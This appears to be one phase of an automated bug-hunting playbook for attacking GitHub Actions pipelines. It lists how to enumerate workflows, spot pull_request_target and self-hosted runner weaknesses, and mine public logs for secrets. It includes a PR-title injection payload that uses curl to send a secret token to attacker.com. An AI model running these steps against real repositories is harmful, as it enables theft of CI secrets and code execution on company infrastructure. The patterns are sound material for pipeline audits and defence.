# ZDH Phase 16: CI/CD Pipeline & GitHub Actions Analysis

## Phase 16 - CI/CD Pipeline & GitHub Actions Analysis

**Goal:** Compromise the build pipeline = RCE on developer machines + access to all secrets.

```bash
# 1. Read all GitHub Actions workflow files
GET https://api.github.com/repos/<org>/<repo>/contents/.github/workflows/
# Fetch each workflow YAML file

# 2. Look for pull_request_target (DANGEROUS - forks can access secrets)
# Vulnerable pattern:
on:
  pull_request_target:
    ...
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out fork code!
      - run: ./build.sh  # fork's code runs with REPO secrets!

# 3. Script injection via PR title/body
# Vulnerable: run: echo "PR title: ${{ github.event.pull_request.title }}"
# Attack: PR title = "; curl https://attacker.com/?token=$SECRET"

# 4. Find exposed secrets in workflow logs
# GitHub Actions logs are PUBLIC for public repos
GET https://api.github.com/repos/<org>/<repo>/actions/runs?per_page=100
# Look for runs with "environment variables" or "debug" output containing secrets

# 5. Self-hosted runner hijack
# If workflow uses: runs-on: self-hosted
# And repo accepts PRs from forks -> attacker can run code on company's self-hosted runner
# Self-hosted runners often have access to internal networks, cloud credentials

# 6. Reusable workflow injection
# Check for: uses: <org>/<repo>/.github/workflows/build.yml@main
# If that referenced repo has unclaimed namespace -> supply chain
```

**Signal:** `emit_signal VULN_CONFIRMED "CI/CD: pull_request_target secret exposure in <repo>" "main/zerodayhunt" 0.93`
